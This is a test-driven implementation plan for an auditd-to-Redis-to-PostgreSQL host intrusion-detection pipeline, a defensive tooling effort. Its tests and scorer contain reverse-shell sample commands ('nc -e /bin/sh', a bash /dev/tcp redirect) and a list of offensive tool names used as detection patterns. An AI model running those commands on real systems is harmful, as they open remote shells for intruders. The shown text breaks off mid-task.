# Month-1 Node Spine Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Make the offline-node spine breathe — a real host telemetry event (auditd `execve`) flows `collector → Redis stream → ai-engine consumer → scored alert persisted in PostgreSQL`, proven by a green node-path e2e, with the Kafka/Flink distributed pipeline gated off the node path.

**Architecture:** Single-host, single-tenant, offline. The collector tails `auditd` and `XADD`s normalized host events onto a Redis stream (`node:events`). The ai-engine runs a stream consumer (`XREADGROUP`) that scores each event with a deterministic rule-based scorer (a clean seam for the Month-2 ML detector) and writes threat alerts to a new **Alembic-owned** `node_alerts` table. No Kafka, no Flink, no DRL on the node path.

**Tech Stack:** Python 3.12, redis-py ≥5.0.1 (streams), psycopg2, Alembic/SQLAlchemy, pytest, fakeredis (test-only). auditd as the telemetry source.

## Global Constants

- Redis stream name: **`node:events`** — env override `NODE_EVENT_STREAM`, default `node:events`.
- Redis stream entry shape: a single field `event` whose value is `json.dumps(HostEvent)`.
- Consumer group: **`node-detector`**; consumer name default **`ai-1`** (env `NODE_CONSUMER_NAME`).
- `HostEvent` dict keys (exact): `event_type:str`, `timestamp:str` (ISO-8601 UTC), `pid:int`, `uid:int`, `comm:str`, `exe:str`, `args:list[str]`, `hostname:str`, `raw:str`.
- DB connection: `DATABASE_URL` env is **required** (raise if unset) — matches `auth-service/app.py:63` and `migrations/env.py:15`.
- Current Alembic head: **`20260624_001_audit_chain`** (file `migrations/versions/20260624_001_audit_event_chain.py`). New migration `down_revision` = this.
- redis pin already present: `redis>=5.0.1` in `ai-engine/requirements.txt:4` and `data-collector/requirements.txt:4`.
- Hard constraint (preserved, not touched this month): **no AI/scorer output auto-enforces** — alerts are advisory rows only; enforcement is a later month and requires human approval.
- All paths below are relative to repo root `/mnt/c/Projects/Sentinel/dragon-scale`; backend root is `sentinel-core/backend`.

## File Structure

| File | Responsibility | Task |
|------|----------------|------|
| `sentinel-core/backend/data-collector/auditd_source.py` | Pure auditd-record → `HostEvent` parser (no I/O) | T1 |
| `sentinel-core/backend/data-collector/node_collector.py` | Tail audit log, group by serial, parse, `XADD` to stream | T2 |
| `sentinel-core/backend/migrations/versions/20260627_001_node_alerts.py` | Alembic-owned `node_alerts` table (fixes alerts-table drift) | T3 |
| `sentinel-core/backend/ai-engine/node_scoring.py` | Deterministic `HostEvent` → verdict scorer + `Scorer` seam | T4 |
| `sentinel-core/backend/_lib/db.py` | Shared `connect(dsn)` psycopg2 helper (first real growth of `_lib`) | T5 |
| `sentinel-core/backend/ai-engine/node_consumer.py` | `XREADGROUP` loop → score → insert `node_alerts` → ack | T5 |
| `sentinel-core/backend/tests/test_node_pipeline.py` | Real node-path e2e (Redis + PG); replaces the xfail crown-jewel | T6 |
| `sentinel-core/backend/data-collector/collector.py` (modify) | Gate Kafka init behind `SENTINEL_BUS` | T7 |
| dedupe `ebpf-lib`/`ebpf_lib`, `firewall-adapters`/`firewall_adapters` | remove non-importable duplicate dirs | T7 |

**Note on the `alerts` table:** the legacy `alerts` table is **not** Alembic-owned — the consolidate migration (`20260417_001_consolidate_schema.py:108-110`) explicitly treats it as a runtime table "not guaranteed to be present." `alert-service` writes alerts to **Redis only** (`alert-service/app.py:166-179`). The node path therefore writes to a **new, migration-owned `node_alerts`** table rather than perpetuating the drift. `host_events` (`migrations/versions/20260304_001_add_host_events_and_hardening.py:37-65`) is already Alembic-owned and is the natural raw-event schema mirror.

---

### Task 1: Auditd execve parser (pure function)

**Files:**
- Create: `sentinel-core/backend/data-collector/auditd_source.py`
- Test: `sentinel-core/backend/data-collector/tests/test_auditd_source.py`

**Interfaces:**
- Consumes: nothing (pure).
- Produces:
  - `parse_event(lines: list[str]) -> dict | None` — lines of ONE audit event (same serial); returns a `HostEvent` dict (Global Constants shape) for `execve` syscalls, else `None`.
  - `_parse_kv(line: str) -> dict[str, str]` — tokenize `key=value` / `key="quoted value"`.
  - `_parse_msg_ts(msg: str) -> str` — `audit(1700000000.123:4567)` → ISO-8601 UTC.

- [ ] **Step 1: Write the failing test**

```python
# sentinel-core/backend/data-collector/tests/test_auditd_source.py
from auditd_source import parse_event, _parse_kv, _parse_msg_ts

SYSCALL = (
    'type=SYSCALL msg=audit(1700000000.123:4567): arch=c000003e syscall=59 '
    'success=yes exit=0 ppid=1000 pid=1234 auid=0 uid=0 gid=0 '
    'comm="bash" exe="/usr/bin/bash" key="exec"'
)
EXECVE = 'type=EXECVE msg=audit(1700000000.123:4567): argc=3 a0="/bin/bash" a1="-c" a2="id"'


def test_parse_kv_handles_quoted_values():
    kv = _parse_kv(SYSCALL)
    assert kv["syscall"] == "59"
    assert kv["comm"] == "bash"
    assert kv["exe"] == "/usr/bin/bash"


def test_parse_msg_ts_is_iso_utc():
    assert _parse_msg_ts("audit(1700000000.123:4567)").startswith("2023-11-14T")
    assert _parse_msg_ts("audit(1700000000.123:4567)").endswith("+00:00")


def test_parse_event_builds_hostevent():
    ev = parse_event([SYSCALL, EXECVE])
    assert ev is not None
    assert ev["event_type"] == "execve"
    assert ev["pid"] == 1234
    assert ev["uid"] == 0
    assert ev["comm"] == "bash"
    assert ev["exe"] == "/usr/bin/bash"
    assert ev["args"] == ["/bin/bash", "-c", "id"]
    assert ev["raw"] == "\n".join([SYSCALL, EXECVE])


def test_parse_event_ignores_non_execve():
    line = 'type=SYSCALL msg=audit(1700000000.123:9): syscall=2 pid=5 uid=0 comm="cat"'
    assert parse_event([line]) is None
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd sentinel-core/backend/data-collector && python -m pytest tests/test_auditd_source.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'auditd_source'`.

- [ ] **Step 3: Write minimal implementation**

```python
# sentinel-core/backend/data-collector/auditd_source.py
"""Pure auditd-record parsing for the offline node path. No I/O."""
from __future__ import annotations

import re
import socket
from datetime import datetime, timezone

_KV_RE = re.compile(r'(\w+)=("([^"]*)"|\S+)')
_MSG_TS_RE = re.compile(r"audit\((\d+)\.(\d+):(\d+)\)")
# x86_64 execve=59, execveat=322; auditd may also render the name when interpreted.
_EXECVE_SYSCALLS = {"59", "322", "execve", "execveat"}


def _parse_kv(line: str) -> dict[str, str]:
    out: dict[str, str] = {}
    for m in _KV_RE.finditer(line):
        key = m.group(1)
        out[key] = m.group(3) if m.group(3) is not None else m.group(2)
    return out


def _parse_msg_ts(msg: str) -> str:
    m = _MSG_TS_RE.search(msg)
    if not m:
        return datetime.now(timezone.utc).isoformat()
    epoch = int(m.group(1)) + int(m.group(2)) / 1000.0
    return datetime.fromtimestamp(epoch, tz=timezone.utc).isoformat()


def _decode_args(execve_kv: dict[str, str]) -> list[str]:
    args: list[str] = []
    i = 0
    while f"a{i}" in execve_kv:
        args.append(execve_kv[f"a{i}"])
        i += 1
    return args


def parse_event(lines: list[str]) -> dict | None:
    syscall_kv: dict[str, str] = {}
    execve_kv: dict[str, str] = {}
    for line in lines:
        if line.startswith("type=SYSCALL"):
            syscall_kv = _parse_kv(line)
        elif line.startswith("type=EXECVE"):
            execve_kv = _parse_kv(line)
    if syscall_kv.get("syscall") not in _EXECVE_SYSCALLS:
        return None
    msg = next((l for l in lines if "msg=audit(" in l), "")
    return {
        "event_type": "execve",
        "timestamp": _parse_msg_ts(msg),
        "pid": int(syscall_kv.get("pid", 0) or 0),
        "uid": int(syscall_kv.get("uid", 0) or 0),
        "comm": syscall_kv.get("comm", ""),
        "exe": syscall_kv.get("exe", ""),
        "args": _decode_args(execve_kv),
        "hostname": socket.gethostname(),
        "raw": "\n".join(lines),
    }
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd sentinel-core/backend/data-collector && python -m pytest tests/test_auditd_source.py -v`
Expected: PASS (4 passed).

- [ ] **Step 5: Commit**

```bash
git add sentinel-core/backend/data-collector/auditd_source.py sentinel-core/backend/data-collector/tests/test_auditd_source.py
git commit -m "feat(collector): pure auditd execve parser for node path"
```

---

### Task 2: Node collector — tail audit log → XADD to Redis stream

**Files:**
- Create: `sentinel-core/backend/data-collector/node_collector.py`
- Modify: `sentinel-core/backend/data-collector/requirements.txt` (add `fakeredis` is test-only → put in `requirements-test.txt` instead; see step)
- Modify: `sentinel-core/backend/requirements-test.txt` (add `fakeredis>=2.21`)
- Test: `sentinel-core/backend/data-collector/tests/test_node_collector.py`

**Interfaces:**
- Consumes: `auditd_source.parse_event` (Task 1).
- Produces:
  - `class NodeCollector(redis_client, stream: str = "node:events")`
  - `NodeCollector.emit(event: dict) -> str` — `XADD`; returns the stream entry id.
  - `NodeCollector.feed_lines(lines: Iterable[str]) -> int` — group raw audit lines by serial, parse, emit each execve; returns count emitted.
  - `_group_by_serial(lines: Iterable[str]) -> list[list[str]]` — split a flat audit-log stream into per-event line groups keyed on the `audit(TS:SERIAL)` serial.

- [ ] **Step 1: Write the failing test**

```python
# sentinel-core/backend/data-collector/tests/test_node_collector.py
import json
import fakeredis
from node_collector import NodeCollector, _group_by_serial

LOG = """\
type=SYSCALL msg=audit(1700000000.1:10): syscall=59 pid=11 uid=0 comm="bash" exe="/usr/bin/bash"
type=EXECVE msg=audit(1700000000.1:10): argc=1 a0="bash"
type=SYSCALL msg=audit(1700000000.2:11): syscall=59 pid=22 uid=1000 comm="nc" exe="/usr/bin/nc"
type=EXECVE msg=audit(1700000000.2:11): argc=3 a0="nc" a1="-e" a2="/bin/sh"
""".splitlines()


def test_group_by_serial_splits_events():
    groups = _group_by_serial(LOG)
    assert len(groups) == 2
    assert all(len(g) == 2 for g in groups)


def test_feed_lines_emits_each_event_to_stream():
    r = fakeredis.FakeStrictRedis(decode_responses=True)
    c = NodeCollector(r, stream="node:events")
    n = c.feed_lines(LOG)
    assert n == 2
    entries = r.xrange("node:events")
    assert len(entries) == 2
    first = json.loads(entries[0][1]["event"])
    assert first["comm"] == "bash"
    second = json.loads(entries[1][1]["event"])
    assert second["comm"] == "nc"
    assert second["args"] == ["nc", "-e", "/bin/sh"]
```

- [ ] **Step 2: Run test to verify it fails**

First add the test dep:
```bash
printf 'fakeredis>=2.21\n' >> sentinel-core/backend/requirements-test.txt
pip install 'fakeredis>=2.21'
```
Run: `cd sentinel-core/backend/data-collector && python -m pytest tests/test_node_collector.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'node_collector'`.

- [ ] **Step 3: Write minimal implementation**

```python
# sentinel-core/backend/data-collector/node_collector.py
"""Tail auditd and publish normalized host events onto a Redis stream."""
from __future__ import annotations

import json
import os
import re
import time
from typing import Iterable

from auditd_source import parse_event

_SERIAL_RE = re.compile(r"audit\(\d+\.\d+:(\d+)\)")
DEFAULT_STREAM = os.environ.get("NODE_EVENT_STREAM", "node:events")


def _group_by_serial(lines: Iterable[str]) -> list[list[str]]:
    groups: dict[str, list[str]] = {}
    order: list[str] = []
    for line in lines:
        m = _SERIAL_RE.search(line)
        if not m:
            continue
        serial = m.group(1)
        if serial not in groups:
            groups[serial] = []
            order.append(serial)
        groups[serial].append(line)
    return [groups[s] for s in order]


class NodeCollector:
    def __init__(self, redis_client, stream: str = DEFAULT_STREAM):
        self.redis = redis_client
        self.stream = stream

    def emit(self, event: dict) -> str:
        return self.redis.xadd(self.stream, {"event": json.dumps(event)})

    def feed_lines(self, lines: Iterable[str]) -> int:
        count = 0
        for group in _group_by_serial(lines):
            event = parse_event(group)
            if event is not None:
                self.emit(event)
                count += 1
        return count

    def tail(self, path: str = "/var/log/audit/audit.log", poll: float = 0.5) -> None:
        with open(path, "r") as fh:
            fh.seek(0, os.SEEK_END)
            buf: list[str] = []
            while True:
                line = fh.readline()
                if not line:
                    if buf:
                        self.feed_lines(buf)
                        buf = []
                    time.sleep(poll)
                    continue
                buf.append(line.rstrip("\n"))
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd sentinel-core/backend/data-collector && python -m pytest tests/test_node_collector.py -v`
Expected: PASS (2 passed).

- [ ] **Step 5: Commit**

```bash
git add sentinel-core/backend/data-collector/node_collector.py sentinel-core/backend/data-collector/tests/test_node_collector.py sentinel-core/backend/requirements-test.txt
git commit -m "feat(collector): tail auditd and XADD host events to node:events stream"
```

---

### Task 3: Alembic migration — `node_alerts` table

**Files:**
- Create: `sentinel-core/backend/migrations/versions/20260627_001_node_alerts.py`
- Test: `sentinel-core/backend/migrations/tests/test_node_alerts_migration.py`

**Interfaces:**
- Consumes: Alembic head `20260624_001_audit_chain`.
- Produces: table `node_alerts` with columns `id, alert_id(uuid), event_type, severity, score, pid, uid, comm, exe, hostname, source_event_id, summary, detail(jsonb), status, created_at`. `downgrade()` drops it.

- [ ] **Step 1: Write the failing test**

```python
# sentinel-core/backend/migrations/tests/test_node_alerts_migration.py
import importlib.util
import os

MIG = os.path.join(
    os.path.dirname(__file__), "..", "versions", "20260627_001_node_alerts.py"
)


def _load():
    spec = importlib.util.spec_from_file_location("node_alerts_mig", MIG)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def test_revision_chain():
    mod = _load()
    assert mod.revision == "20260627_001_node_alerts"
    assert mod.down_revision == "20260624_001_audit_chain"


def test_has_upgrade_and_downgrade():
    mod = _load()
    assert callable(mod.upgrade)
    assert callable(mod.downgrade)
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd sentinel-core/backend && python -m pytest migrations/tests/test_node_alerts_migration.py -v`
Expected: FAIL with `FileNotFoundError`/`spec ... is None` (migration file absent).

- [ ] **Step 3: Write minimal implementation**

```python
# sentinel-core/backend/migrations/versions/20260627_001_node_alerts.py
"""Add node_alerts: the migration-owned alert sink for the offline node path.

Revision ID: 20260627_001_node_alerts
Revises: 20260624_001_audit_chain
Create Date: 2026-06-27
"""
from __future__ import annotations

from typing import Union

import sqlalchemy as sa
from alembic import op

revision: str = "20260627_001_node_alerts"
down_revision: Union[str, None] = "20260624_001_audit_chain"
branch_labels = None
depends_on = None


def upgrade() -> None:
    op.create_table(
        "node_alerts",
        sa.Column("id", sa.BigInteger, primary_key=True, autoincrement=True),
        sa.Column(
            "alert_id",
            sa.dialects.postgresql.UUID,
            server_default=sa.text("gen_random_uuid()"),
            unique=True,
            nullable=False,
        ),
        sa.Column("event_type", sa.String(50), nullable=False),
        sa.Column("severity", sa.String(20), server_default="medium", nullable=False),
        sa.Column("score", sa.Numeric(5, 4)),
        sa.Column("pid", sa.Integer),
        sa.Column("uid", sa.Integer),
        sa.Column("comm", sa.String(64)),
        sa.Column("exe", sa.String(512)),
        sa.Column("hostname", sa.String(255)),
        sa.Column("source_event_id", sa.String(128)),
        sa.Column("summary", sa.Text),
        sa.Column("detail", sa.dialects.postgresql.JSONB),
        sa.Column("status", sa.String(20), server_default="new", nullable=False),
        sa.Column(
            "created_at",
            sa.DateTime(timezone=True),
            server_default=sa.text("CURRENT_TIMESTAMP"),
            nullable=False,
        ),
    )
    op.execute(
        "CREATE INDEX IF NOT EXISTS idx_node_alerts_created_at "
        "ON node_alerts (created_at DESC)"
    )
    op.execute(
        "CREATE INDEX IF NOT EXISTS idx_node_alerts_severity "
        "ON node_alerts (severity)"
    )


def downgrade() -> None:
    op.drop_table("node_alerts")
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd sentinel-core/backend && python -m pytest migrations/tests/test_node_alerts_migration.py -v`
Expected: PASS (2 passed).

Then verify it actually applies against the local stack DB (the `sentinel-postgres` container / db `sentinel`):
Run: `cd sentinel-core/backend && DATABASE_URL=postgresql://sentinel:sentinel@localhost:5432/sentinel alembic -c migrations/alembic.ini upgrade head`
Expected: `Running upgrade 20260624_001_audit_chain -> 20260627_001_node_alerts`.
Confirm round-trips: `alembic -c migrations/alembic.ini downgrade -1` then `upgrade head` again — both clean.

- [ ] **Step 5: Commit**

```bash
git add sentinel-core/backend/migrations/versions/20260627_001_node_alerts.py sentinel-core/backend/migrations/tests/test_node_alerts_migration.py
git commit -m "feat(db): node_alerts table — migration-owned alert sink for node path"
```

---

### Task 4: Host-event scorer (deterministic, with ML seam)

**Files:**
- Create: `sentinel-core/backend/ai-engine/node_scoring.py`
- Test: `sentinel-core/backend/ai-engine/tests/test_node_scoring.py`

**Interfaces:**
- Consumes: a `HostEvent` dict (Global Constants shape).
- Produces:
  - `score_event(event: dict) -> dict` returning `{"is_threat": bool, "score": float, "severity": str, "summary": str}`.
  - `class RuleScorer` with `.score(event) -> dict` (delegates to `score_event`).
  - `HostEventScorer` Protocol (`.score(event) -> dict`) — the seam the Month-2 trained ML detector implements.

- [ ] **Step 1: Write the failing test**

```python
# sentinel-core/backend/ai-engine/tests/test_node_scoring.py
from node_scoring import score_event, RuleScorer


def _ev(**kw):
    base = {"event_type": "execve", "comm": "", "exe": "", "args": []}
    base.update(kw)
    return base


def test_reverse_shell_is_critical():
    v = score_event(_ev(comm="bash", exe="/usr/bin/bash",
                        args=["bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"]))
    assert v["is_threat"] is True
    assert v["severity"] == "critical"
    assert "/dev/tcp" in v["summary"]


def test_offensive_tool_flagged():
    v = score_event(_ev(comm="nc", exe="/usr/bin/nc", args=["nc", "-e", "/bin/sh"]))
    assert v["is_threat"] is True
    assert v["score"] >= 0.9


def test_exec_from_tmp_is_high():
    v = score_event(_ev(comm="x", exe="/tmp/x", args=["/tmp/x"]))
    assert v["is_threat"] is True
    assert v["severity"] == "high"


def test_benign_is_not_threat():
    v = score_event(_ev(comm="ls", exe="/usr/bin/ls", args=["ls", "-la"]))
    assert v["is_threat"] is False
    assert v["severity"] == "info"


def test_rulescorer_matches_function():
    ev = _ev(comm="nc", exe="/usr/bin/nc", args=["nc"])
    assert RuleScorer().score(ev) == score_event(ev)
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd sentinel-core/backend/ai-engine && python -m pytest tests/test_node_scoring.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'node_scoring'`.

- [ ] **Step 3: Write minimal implementation**

```python
# sentinel-core/backend/ai-engine/node_scoring.py
"""Deterministic host-event scorer for the node path.

This is the Month-1 spine scorer: explicit rules, fully deterministic, easy to
test. It implements the HostEventScorer seam so the Month-2 trained ML detector
can be dropped in without touching the consumer.
"""
from __future__ import annotations

from typing import Protocol

THREAT_COMMS = {"nc", "ncat", "socat", "msfconsole", "mimikatz"}
SHELL_COMMS = {"sh", "bash", "zsh", "dash", "ksh"}
WORLD_WRITABLE_PREFIXES = ("/tmp/", "/dev/shm/", "/var/tmp/")
THRESHOLD = 0.5


def score_event(event: dict) -> dict:
    comm = (event.get("comm") or "").lower()
    exe = (event.get("exe") or "").lower()
    args = " ".join(event.get("args") or []).lower()
    score = 0.0
    reasons: list[str] = []

    if "/dev/tcp/" in args or "/dev/udp/" in args:
        score = max(score, 0.95)
        reasons.append("shell redirect to /dev/tcp (reverse shell)")
    if comm in THREAT_COMMS:
        score = max(score, 0.9)
        reasons.append(f"offensive tool '{comm}'")
    if exe.startswith(WORLD_WRITABLE_PREFIXES):
        score = max(score, 0.7)
        reasons.append(f"exec from world-writable path '{exe}'")
    if comm in SHELL_COMMS and (" -i" in f" {args}" or args.endswith(" -i")):
        score = max(score, 0.6)
        reasons.append("interactive shell")

    is_threat = score >= THRESHOLD
    if score >= 0.9:
        severity = "critical"
    elif score >= 0.7:
        severity = "high"
    elif score >= THRESHOLD:
        severity = "medium"
    else:
        severity = "info"

    return {
        "is_threat": is_threat,
        "score": round(score, 4),
        "severity": severity,
        "summary": "; ".join(reasons) or "no suspicious indicators",
    }


class HostEventScorer(Protocol):
    def score(self, event: dict) -> dict: ...


class RuleScorer:
    """Default Month-1 scorer. Swap for the ML detector in Month-2."""

    def score(self, event: dict) -> dict:
        return score_event(event)
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd sentinel-core/backend/ai-engine && python -m pytest tests/test_node_scoring.py -v`
Expected: PASS (5 passed).

- [ ] **Step 5: Commit**

```bash
git add sentinel-core/backend/ai-engine/node_scoring.py sentinel-core/backend/ai-engine/tests/test_node_scoring.py
git commit -m "feat(ai-engine): deterministic host-event scorer with ML seam"
```

---

### Task 5: Stream consumer — XREADGROUP → score → insert node_alerts

**Files:**
- Create: `sentinel-core/backend/_lib/db.py`
- Create: `sentinel-core/backend/ai-engine/node_consumer.py`
- Modify: `sentinel-core/backend/ai-engine/requirements.txt` (add `psycopg2-binary>=2.9`)
- Test: `sentinel-core/backend/ai-engine/tests/test_node_consumer.py`

**Interfaces:**
- Consumes: `node_scoring.RuleScorer` (Task 4); Redis stream `node:events`; `_lib.db.connect`.
- Produces:
  - `_lib.db.connect(dsn: str | None = None)` → a psycopg2 connection (raises if `DATABASE_URL` unset).
  - `class NodeConsumer(redis_client, scorer, stream="node:events", group="node-detector", consumer="ai-1")`.
  - `NodeConsumer.ensure_group() -> None` — idempotent `XGROUP CREATE ... MKSTREAM`.
  - `NodeConsumer.process_once(conn, block_ms=5000, count=10) -> int` — read a batch, score, insert threat alerts, ack; returns alerts written.
  - `NodeConsumer._insert_alert(conn, source_id, event, verdict) -> None` — one INSERT into `node_alerts`.

- [ ] **Step 1: Write the failing test**

```python
# sentinel-core/backend/ai-engine/tests/test_node_consumer.py
import json
import fakeredis
from node_consumer import NodeConsumer
from node_scoring import RuleScorer


class FakeCursor:
    def __init__(self, sink):
        self.sink = sink
    def __enter__(self):
        return self
    def __exit__(self, *a):
        return False
    def execute(self, sql, params=None):
        self.sink.append((sql, params))


class FakeConn:
    def __init__(self):
        self.calls = []
        self.commits = 0
    def cursor(self):
        return FakeCursor(self.calls)
    def commit(self):
        self.commits += 1


def _consumer():
    r = fakeredis.FakeStrictRedis(decode_responses=True)
    c = NodeConsumer(r, RuleScorer(), stream="node:events",
                     group="node-detector", consumer="ai-1")
    c.ensure_group()
    return r, c


def test_threat_event_inserts_alert_and_acks():
    r, c = _consumer()
    r.xadd("node:events", {"event": json.dumps(
        {"event_type": "execve", "comm": "nc", "exe": "/usr/bin/nc",
         "args": ["nc", "-e", "/bin/sh"], "pid": 7, "uid": 0,
         "hostname": "h", "timestamp": "2026-06-27T00:00:00+00:00", "raw": "x"})})
    conn = FakeConn()
    written = c.process_once(conn, block_ms=10, count=10)
    assert written == 1
    assert conn.commits == 1
    sql, params = conn.calls[0]
    assert "insert into node_alerts" in sql.lower()
    assert "nc" in params  # comm present in insert params
    # acked -> no pending
    pending = r.xpending("node:events", "node-detector")
    assert pending["pending"] == 0


def test_benign_event_writes_no_alert_but_acks():
    r, c = _consumer()
    r.xadd("node:events", {"event": json.dumps(
        {"event_type": "execve", "comm": "ls", "exe": "/usr/bin/ls",
         "args": ["ls"], "pid": 9, "uid": 0, "hostname": "h",
         "timestamp": "2026-06-27T00:00:00+00:00", "raw": "x"})})
    conn = FakeConn()
    written = c.process_once(conn, block_ms=10, count=10)
    assert written == 0
    assert conn.calls == []
    pending = r.xpending("node:events", "node-detector")
    assert pending["pending"] == 0
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd sentinel-core/backend/ai-engine && python -m pytest tests/test_node_consumer.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'node_consumer'`.

- [ ] **Step 3: Write minimal implementation**

```python
# sentinel-core/backend/_lib/db.py
"""Shared PostgreSQL connection helper for node-path services."""
from __future__ import annotations

import os

import psycopg2


def connect(dsn: str | None = None):
    dsn = dsn or os.environ.get("DATABASE_URL")
    if not dsn:
        raise RuntimeError("DATABASE_URL environment variable is required")
    return psycopg2.connect(dsn)
```

```python
# sentinel-core/backend/ai-engine/node_consumer.py
"""Consume host events from the Redis stream, score them, persist alerts."""
from __future__ import annotations

import json
import logging
import os

import redis

from node_scoring import HostEventScorer

logger = logging.getLogger(__name__)

_INSERT_SQL = """
    INSERT INTO node_alerts
        (event_type, severity, score, pid, uid, comm, exe, hostname,
         source_event_id, summary, detail, status)
    VALUES
        (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s::jsonb, 'new')
"""


class NodeConsumer:
    def __init__(
        self,
        redis_client,
        scorer: HostEventScorer,
        stream: str = os.environ.get("NODE_EVENT_STREAM", "node:events"),
        group: str = "node-detector",
        consumer: str = os.environ.get("NODE_CONSUMER_NAME", "ai-1"),
    ):
        self.redis = redis_client
        self.scorer = scorer
        self.stream = stream
        self.group = group
        self.consumer = consumer

    def ensure_group(self) -> None:
        try:
            self.redis.xgroup_create(self.stream, self.group, id="0", mkstream=True)
        except redis.exceptions.ResponseError as e:
            if "BUSYGROUP" not in str(e):
                raise

    def _insert_alert(self, conn, source_id, event: dict, verdict: dict) -> None:
        with conn.cursor() as cur:
            cur.execute(
                _INSERT_SQL,
                (
                    event.get("event_type", "execve"),
                    verdict["severity"],
                    verdict["score"],
                    event.get("pid"),
                    event.get("uid"),
                    event.get("comm"),
                    event.get("exe"),
                    event.get("hostname"),
                    str(source_id),
                    verdict["summary"],
                    json.dumps(event),
                ),
            )
        conn.commit()

    def process_once(self, conn, block_ms: int = 5000, count: int = 10) -> int:
        resp = self.redis.xreadgroup(
            self.group, self.consumer, {self.stream: ">"},
            count=count, block=block_ms,
        )
        written = 0
        for _stream, entries in resp or []:
            for msg_id, fields in entries:
                raw = fields.get("event") or fields.get(b"event")
                if isinstance(raw, bytes):
                    raw = raw.decode()
                event = json.loads(raw)
                verdict = self.scorer.score(event)
                if verdict["is_threat"]:
                    self._insert_alert(conn, msg_id, event, verdict)
                    written += 1
                self.redis.xack(self.stream, self.group, msg_id)
        return written

    def run(self, conn) -> None:  # pragma: no cover - long-running loop
        self.ensure_group()
        while True:
            self.process_once(conn)
```

Add the driver dep:
```bash
printf 'psycopg2-binary>=2.9\n' >> sentinel-core/backend/ai-engine/requirements.txt
pip install 'psycopg2-binary>=2.9'
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd sentinel-core/backend/ai-engine && python -m pytest tests/test_node_consumer.py -v`
Expected: PASS (2 passed).

- [ ] **Step 5: Commit**

```bash
git add sentinel-core/backend/_lib/db.py sentinel-core/backend/ai-engine/node_consumer.py sentinel-core/backend/ai-engine/tests/test_node_consumer.py sentinel-core/backend/ai-engine/requirements.txt
git commit -m "feat(ai-engine): node stream consumer scores events and writes node_alerts"
```

---

### Task 6: Node-path e2e — replace the xfail crown-jewel

**Files:**
- Create: `sentinel-core/backend/tests/test_node_pipeline.py`
- Modify: `sentinel-core/backend/tests/test_e2e_pipeline.py:386-391` (convert the Kafka/Flink `xfail` to an explicit `skip` for the retired distributed path)

**Interfaces:**
- Consumes: real Redis + real PostgreSQL (local stack); `NodeCollector` (T2), `NodeConsumer` (T5), `node_alerts` table (T3).
- Produces: a passing assertion that an injected malicious `execve` becomes a `node_alerts` row.

- [ ] **Step 1: Write the failing test**

```python
# sentinel-core/backend/tests/test_node_pipeline.py
"""Real node-path e2e: auditd event -> Redis stream -> ai-engine -> node_alerts.

Requires a live Redis and PostgreSQL (the local docker-compose stack). Skips
cleanly when they are unreachable, like test_e2e_pipeline.py.
"""
import json
import os
import sys
import uuid

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "ai-engine"))
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "data-collector"))

REDIS_URL = os.environ.get("REDIS_URL", "redis://localhost:6379")
DATABASE_URL = os.environ.get(
    "DATABASE_URL", "postgresql://sentinel:sentinel@localhost:5432/sentinel"
)


@pytest.fixture(scope="module")
def redis_client():
    redis = pytest.importorskip("redis")
    client = redis.from_url(REDIS_URL, decode_responses=True)
    try:
        client.ping()
    except Exception:
        pytest.skip(f"Redis not reachable at {REDIS_URL}")
    return client


@pytest.fixture(scope="module")
def pg_conn():
    psycopg2 = pytest.importorskip("psycopg2")
    try:
        conn = psycopg2.connect(DATABASE_URL)
    except Exception:
        pytest.skip(f"PostgreSQL not reachable at {DATABASE_URL}")
    yield conn
    conn.close()


def test_malicious_execve_becomes_node_alert(redis_client, pg_conn):
    from node_collector import NodeCollector
    from node_consumer import NodeConsumer
    from node_scoring import RuleScorer

    marker = uuid.uuid4().hex
    stream = f"node:events:test:{marker}"
    group = f"node-detector-test-{marker}"

    collector = NodeCollector(redis_client, stream=stream)
    audit_lines = [
        f'type=SYSCALL msg=audit(1700000000.1:1): syscall=59 pid=4242 uid=0 '
        f'comm="nc" exe="/usr/bin/nc" key="exec-{marker}"',
        'type=EXECVE msg=audit(1700000000.1:1): argc=3 a0="nc" a1="-e" a2="/bin/sh"',
    ]
    assert collector.feed_lines(audit_lines) == 1

    consumer = NodeConsumer(redis_client, RuleScorer(), stream=stream,
                            group=group, consumer="test")
    consumer.ensure_group()
    written = consumer.process_once(pg_conn, block_ms=1000, count=10)
    assert written == 1

    with pg_conn.cursor() as cur:
        cur.execute(
            "SELECT severity, comm, summary FROM node_alerts "
            "WHERE source_event_id IS NOT NULL AND comm = 'nc' "
            "ORDER BY id DESC LIMIT 1"
        )
        row = cur.fetchone()
    assert row is not None
    assert row[0] in ("high", "critical")
    assert row[1] == "nc"

    # cleanup
    redis_client.delete(stream)
    pg_conn.rollback()
```

- [ ] **Step 2: Run test to verify it fails**

Ensure the stack is up and migrated first:
```bash
cd sentinel-core && docker compose up -d postgres redis
cd backend && DATABASE_URL=postgresql://sentinel:sentinel@localhost:5432/sentinel alembic -c migrations/alembic.ini upgrade head
```
Run: `cd sentinel-core/backend && python -m pytest tests/test_node_pipeline.py -v`
Expected: FAIL on the `INSERT` if T3 not applied, or PASS once T3..T5 are in and the stack is healthy. If Redis/PG are down it SKIPS — that is acceptable for CI but the local run MUST pass (not skip) to close this task.

- [ ] **Step 3: Convert the legacy distributed-path xfail to skip**

In `sentinel-core/backend/tests/test_e2e_pipeline.py`, replace the `pytest.xfail(...)` block at the end of the full-pipeline test:

```python
        if not new_policy_found:
